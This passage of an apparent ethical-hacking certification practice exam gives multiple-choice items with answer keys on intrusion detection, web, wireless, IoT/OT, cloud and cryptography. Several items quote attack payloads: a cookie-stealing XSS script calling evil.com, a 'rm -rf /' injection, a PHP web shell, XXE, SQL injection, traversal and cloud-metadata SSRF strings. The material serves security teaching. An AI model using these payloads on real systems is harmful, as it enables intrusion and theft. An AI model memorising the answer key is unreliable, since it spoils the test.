    - A) Nessus and Nikto  B) Nmap and Wireshark  C) John and Hashcat  D) Ferret and Hamster
    - **Answer: D**

82. Which cookie attribute prevents client-side JavaScript from accessing the session token?
    - A) Secure  B) SameSite  C) HttpOnly  D) Domain
    - **Answer: C**

83. A security device monitors traffic and sends an alert when a packet matches a known attack pattern. This device is operating as:
    - A) IPS  B) Router  C) IDS  D) Firewall
    - **Answer: C**

84. Which open-source tool can be configured as both an IDS and IPS by using inline mode?
    - A) Nmap  B) Metasploit  C) Snort  D) Wireshark
    - **Answer: C**

85. An attacker fragments the TCP header across multiple packets so that the IDS fails to reassemble and detect the attack string, while the target reassembles correctly. This is:
    - A) ARP spoofing  B) Session hijacking  C) Insertion  D) Evasion
    - **Answer: D**

86. A network allows outbound DNS queries only. An attacker wants to exfiltrate data. He could use:
    - A) DNS tunneling  B) SYN flood  C) ARP poisoning  D) SQL injection
    - **Answer: A**

87. An attacker plugs a network hub between a trusted IP phone and the wall jack, then connects a laptop. The laptop is granted network access because it inherits the phone's authorization. This bypass technique exploits:
    - A) VoIP phone passthrough/NAC bypass  B) Weak MAC filtering  C) ARP poisoning  D) DNS spoofing
    - **Answer: A**

88. A penetration tester needs to generate a Windows reverse shell executable that will not be detected by most antivirus. Which tool is purpose-built for this?
    - A) Wireshark  B) Hydra  C) Nessus  D) Veil-Framework
    - **Answer: D**

89. An attacker scans a system and finds ports 1-1000 all open with generic service banners and the MAC address starting with 00:00:0C. What is likely?
    - A) A router  B) A firewall  C) A real server  D) A honeypot, possibly Honeyd
    - **Answer: D**

90. Which configuration best prevents attackers from using DNS tunneling for exfiltration?
    - A) Use a DNS security solution that analyzes query content and limits query size  B) Allow all outbound DNS  C) Disable ICMP  D) Block TCP port 53
    - **Answer: A**

### Domain 5: Web Application Hacking
91. An organization's public-facing web server shows "Apache/2.4.7 (Ubuntu)" in the HTTP response header. What can an attacker infer?
    - A) The server uses IIS  B) The server is running on Windows  C) The server is vulnerable to SQL injection  D) The server OS and web server version
    - **Answer: D**

92. An attacker sends a request `GET /../../../../etc/passwd HTTP/1.1` to a web server. What attack is being attempted?
    - A) CSRF  B) XSS  C) Directory traversal  D) SQL injection
    - **Answer: C**

93. After mirroring a target website using HTTrack, an attacker scans the local copy for comments and hidden paths. Which phase is this?
    - A) Session hijacking  B) Web server footprinting  C) Vulnerability scanning  D) Information gathering
    - **Answer: B**

94. Which measure best protects a web server from known attack signatures?
    - A) Disable ICMP  B) Deploy a Web Application Firewall with updated rules  C) Use HTTPS  D) Change the server banner
    - **Answer: B**

95. A security team discovers a critical vulnerability in Apache. What should they do before applying the patch to the production server?
    - A) Immediately apply it  B) Shut down the server  C) Ignore until next monthly cycle  D) Test the patch in a staging environment
    - **Answer: D**

96. An application processes user-supplied search queries and reflects results without sanitization. What is the potential security risk?
    - A) Buffer overflow  B) SQL injection  C) Reflected XSS  D) Directory traversal
    - **Answer: C**

97. A web app accepts XML input and processes external entities, allowing an attacker to read local files. This vulnerability is:
    - A) CSRF  B) File upload  C) XML External Entity (XXE)  D) SQL Injection
    - **Answer: C**

98. According to CEH, which step comes immediately after analyzing the web application's structure?
    - A) Bypass client-side controls  B) Attack session management  C) Perform SQL injection  D) Attack authentication
    - **Answer: A**

99. A pen tester uses `dnsrecon -d target.com -t axfr` and gets a list of all subdomains. This succeeded because:
    - A) SMTP VRFY was enabled  B) The web server had directory listing  C) The DNS server allowed zone transfer  D) SNMP was open
    - **Answer: C**

100. An attacker finds that changing the hidden field `price=100` to `price=1` allows purchasing an item for $1. What web app flaw is this?
     - A) XSS  B) Parameter tampering  C) CSRF  D) SQL injection
     - **Answer: B**

101. A web app uses JavaScript to validate that an email field contains '@'. How can an attacker bypass this?
     - A) CSRF  B) SQL injection  C) XSS  D) Disable JavaScript and send the request with a proxy
     - **Answer: D**

102. An attacker uses the username `admin'--` and a blank password on a login form, gaining access. Which attack?
     - A) SQL injection authentication bypass  B) Brute force  C) Session hijacking  D) XSS
     - **Answer: A**

103. After logging in as a regular user, an attacker changes the URL from `/profile/123` to `/profile/124` and sees another user's profile. This indicates:
     - A) Broken authentication  B) SQL injection  C) CSRF  D) Insecure Direct Object Reference
     - **Answer: D**

104. A web application has no link to the admin page, but the developer left the page accessible at `/admin.php`. An attacker discovers it via directory brute-force. This is:
     - A) Session hijacking  B) SQLi  C) Phishing  D) Forced browsing
     - **Answer: D**

105. A banking app uses a session cookie with value "user=John; sessionid=12345". The attacker changes sessionid to 12346 and becomes another user. What is the flaw?
     - A) SQL injection  B) CSRF  C) XSS  D) Weak session ID generation (predictable)
     - **Answer: D**

106. A web app has a search form that runs a system command `grep -i user_input file`. An attacker inputs `; rm -rf /`. What attack?
     - A) File inclusion  B) SQL injection  C) OS command injection  D) XSS
     - **Answer: C**

107. A travel booking site allows a user to book a flight, then change the passenger name after payment. An attacker books a cheap ticket, then changes the name to a different flight. This is an example of:
     - A) XSS  B) Application logic flaw  C) SQL injection  D) CSRF
     - **Answer: B**

108. A website hosted on shared hosting is defaced. The attacker uploaded a shell via a vulnerability in another site on the same server. This is possible because of:
     - A) Insufficient isolation in shared hosting  B) SQL injection  C) Cross-site scripting  D) DNS poisoning
     - **Answer: A**

109. An attacker obtains the database password from a web.config file exposed via directory traversal. Which attack can now be conducted?
     - A) Phishing  B) Direct database access and data exfiltration  C) Session hijacking  D) XSS
     - **Answer: B**

110. An attacker posts a message on a forum containing `<script>new Image().src='http://evil.com/steal?c='+document.cookie</script>`. All forum visitors lose their session cookies. This is:
     - A) Stored XSS  B) SQL injection  C) Reflected XSS  D) CSRF
     - **Answer: A**

111. A web service uses SOAP and accepts XML input. An attacker includes `<!ENTITY xxe SYSTEM "file:///etc/passwd">` and gets the file contents. This is:
     - A) XSS  B) XXE injection  C) SQL injection  D) CSRF
     - **Answer: B**

112. A defender finds a file `images.php` in the uploads folder containing `<?php eval(base64_decode($_POST['cmd'])); ?>`. What is this file?
     - A) Legitimate image processor  B) API endpoint  C) Database connector  D) A web shell
     - **Answer: D**

113. Which HTTP response header instructs the browser to only communicate over HTTPS?
     - A) Strict-Transport-Security  B) Content-Security-Policy  C) X-Frame-Options  D) Cache-Control
     - **Answer: A**

114. An attacker inputs `' OR 1=1 --` into a login form and gains access. What SQLi technique?
     - A) Error-based  B) Authentication bypass via true condition  C) Blind SQLi  D) Union-based
     - **Answer: B**

115. A web app does not show any database output, but an attacker injects `' AND (SELECT IF(1=1, SLEEP(5), 0))--` and the response is delayed. This is:
     - A) Time-based blind SQLi  B) Boolean blind SQLi  C) Union-based SQLi  D) Error-based SQLi
     - **Answer: A**

116. An attacker uses `?id=1 ORDER BY 10--` and gets an error, but `?id=1 ORDER BY 5--` works normally. What is concluded?
     - A) The query uses 5 columns  B) The injection is blind  C) The database is Oracle  D) The server is Windows
     - **Answer: A**

117. A penetration tester wants to retrieve all databases from a MySQL server using SQLMap. Which command?
     - A) `sqlmap -u target --passwords`  B) `sqlmap -u target --dbs`  C) `sqlmap -u target --tables`  D) `sqlmap -u target --os-shell`
     - **Answer: B**

118. A WAF blocks requests containing "UNION SELECT". An attacker bypasses it using `/*!50000UNION*/ SELECT`. This works because:
     - A) It triggers a buffer overflow  B) It uses encoding  C) It is a comment syntax that MySQL executes as SQL  D) It changes case
     - **Answer: C**

119. Which defense completely prevents SQL injection by ensuring user input is never interpreted as SQL?
     - A) HTTPS  B) Parameterized queries  C) Output encoding  D) Input validation blacklist
     - **Answer: B**

### Domain 6: Wireless Network Hacking
120. Which 802.11 standard operates exclusively in the 5 GHz band and supports up to 1 Gbps?
     - A) 802.11ac  B) 802.11n  C) 802.11b  D) 802.11g
     - **Answer: A**

121. A wireless network uses AES encryption and requires a pre-shared key. This is:
     - A) WPA2-Personal  B) WEP  C) WPA2-Enterprise  D) WPA
     - **Answer: A**

122. An attacker sets up an AP broadcasting the same SSID as a coffee shop's free Wi-Fi. Users connect and enter passwords which are captured. This is a:
     - A) Rogue AP  B) Wardriving  C) Jamming  D) Evil twin
     - **Answer: D**

123. To crack WEP, an attacker needs to capture a large number of:
     - A) Beacon frames  B) Data packets with weak initialization vectors  C) SSIDs  D) ACKs
     - **Answer: B**

124. Which tool is specifically used to brute-force the WPS PIN?
     - A) Wireshark  B) Nmap  C) Aircrack-ng  D) Reaver
     - **Answer: D**

125. An attacker connects to a phone and remotely makes calls without the owner's knowledge. This is:
     - A) Bluebugging  B) Bluesnarfing  C) Bluejacking  D) Bluecasing
     - **Answer: A**

126. Which is the most effective method to secure a Wi-Fi network?
     - A) WPA2/3 with strong passphrase  B) Use static IPs  C) MAC filtering  D) Disable SSID broadcast
     - **Answer: A**

127. Which tool can be used to detect and locate rogue access points?
     - A) Hydra  B) Aircrack-ng  C) Kismet  D) Nmap
     - **Answer: C**

### Domain 7: Mobile, IoT, and OT Hacking
128. An attacker creates a fake banking app and uploads it to a third-party app store. Victims install it and enter credentials. This is an example of:
     - A) SIM swapping  B) Bluebugging  C) Phishing  D) Trojan app
     - **Answer: D**

129. An attacker uses `adb connect 192.168.1.10` and gets a shell. What must be enabled on the device?
     - A) Bluetooth  B) NFC  C) USB debugging and network ADB  D) Wi-Fi only
     - **Answer: C**

130. An employee jailbreaks their iPhone to install unapproved apps. What is the primary security risk?
     - A) iCloud backup fails  B) No 5G  C) Bypass of iOS security sandbox and app review  D) Reduced battery life
     - **Answer: C**

131. An organization allows personal devices but wants to ensure corporate data is isolated and can be remotely wiped without affecting personal data. What solution?
     - A) Firewall  B) MDM with containerization  C) Antivirus  D) VPN
     - **Answer: B**

132. A mobile app stores user passwords in plaintext in the shared preferences file. Which OWASP Mobile category does this fall under?
     - A) Weak server-side controls  B) Insecure data storage  C) Client code quality  D) Insecure communication
     - **Answer: B**

133. Which protocol is a lightweight publish-subscribe messaging protocol designed for constrained devices?
     - A) HTTP  B) SSH  C) FTP  D) MQTT
     - **Answer: D**

134. An attacker uses a serial interface on an IoT device to access the bootloader and extract firmware. This is:
     - A) SQL injection  B) Physical hardware hacking via JTAG/UART  C) Phishing  D) XSS
     - **Answer: B**

135. A security researcher uses Shodan to search for "port:1883" and finds many open MQTT brokers. This is part of which phase?
     - A) Exploitation  B) Information gathering  C) Clearing logs  D) Post-exploitation
     - **Answer: B**

136. What is the most effective way to prevent an attacker from brute-forcing the password of an IoT device's admin panel?
     - A) Change default password and implement account lockout  B) Use MQTT  C) Disable Wi-Fi  D) Hide the device
     - **Answer: A**

137. Which protocol is commonly used in SCADA systems for communication between master and remote terminal units?
     - A) Modbus  B) HTTP  C) SMTP  D) DNS
     - **Answer: A**

138. What was the primary delivery method of the Stuxnet worm into the air-gapped Natanz facility?
     - A) RDP brute-force  B) Infected USB drives  C) Phishing email  D) SQL injection
     - **Answer: B**

139. An attacker uses Nmap script `modbus-discover` and gets device ID and coil status. This indicates:
     - A) DNS service  B) SNMP enabled  C) HTTP server  D) Modbus service is running and accessible without authentication
     - **Answer: D**

140. According to best practices, where should a SCADA server be placed to protect it from internet attacks?
     - A) In the cloud without firewall  B) Directly on the internet  C) In the OT network, behind a firewall with a DMZ  D) On the same subnet as guest Wi-Fi
     - **Answer: C**

### Domain 8: Cloud Computing
141. In which cloud service model does the customer manage the operating system and applications?
     - A) SaaS  B) IaaS  C) None  D) PaaS
     - **Answer: B**

142. An attacker compromises a container and finds that `/var/run/docker.sock` is mounted. This can allow:
     - A) XSS  B) DDoS  C) SQL injection  D) Container escape and host compromise
     - **Answer: D**

143. A serverless function is triggered by an HTTP request and processes user-supplied data without sanitization, leading to code execution. This is:
     - A) SQL injection  B) Injection vulnerability in serverless function  C) ARP spoofing  D) XSS
     - **Answer: B**

144. A company's AWS S3 bucket containing customer PII is set to "public" for read access. This is:
     - A) A DDoS attack  B) Malware  C) A security misconfiguration  D) Phishing
     - **Answer: C**

145. An attacker exploits an SSRF vulnerability in a web app to request `http://169.254.169.254/latest/meta-data/iam/security-credentials/` and obtains AWS keys. This attack targets:
     - A) DNS  B) SMTP  C) SQL server  D) Cloud instance metadata service
     - **Answer: D**

146. To prevent unauthorized access to AWS resources, which practice is essential?
     - A) Use IAM policies with least privilege and enable MFA  B) Enable public access  C) Use default VPC  D) Share root credentials
     - **Answer: A**

### Domain 9: Cryptography
147. Which type of encryption algorithm uses the same key for both encryption and decryption?
     - A) Digital signature  B) Asymmetric  C) Hashing  D) Symmetric
     - **Answer: D**

148. An organization needs to exchange a session key securely over an insecure channel. Which algorithm is designed for this?
     - A) Base64  B) AES  C) Diffie-Hellman  D) SHA-256
     - **Answer: C**

149. A security analyst needs to create a self-signed certificate for a web server. Which command-line tool would they likely use?
     - A) John the Ripper  B) OpenSSL  C) Wireshark  D) Nmap
     - **Answer: B**

150. A browser needs to check if a website's certificate has been revoked. Which protocol provides real-time status?
     - A) CRL  B) DHCP  C) OCSP  D) DNS
     - **Answer: C**

151. Which email encryption protocol uses a distributed trust model (web of trust) instead of a central CA?
     - A) S/MIME  B) IPsec  C) SSL/TLS  D) PGP
     - **Answer: D**

152. A laptop with BitLocker enabled is stolen. What prevents the thief from accessing the data?
     - A) Antivirus  B) Strong Windows password  C) BIOS password  D) The disk is encrypted and requires the decryption key
     - **Answer: D**

153. An attacker intercepts encrypted messages and also knows some plaintext portions (e.g., header). They use this to derive the key. What type of attack?
     - A) Brute-force  B) Known-plaintext  C) Replay  D) Chosen-ciphertext
     - **Answer: B**

154. To defend against rainbow table attacks on password databases, what should be used?
     - A) Long passwords  B) A unique salt per password  C) MD5 hashing  D) Strong encryption
     - **Answer: B**
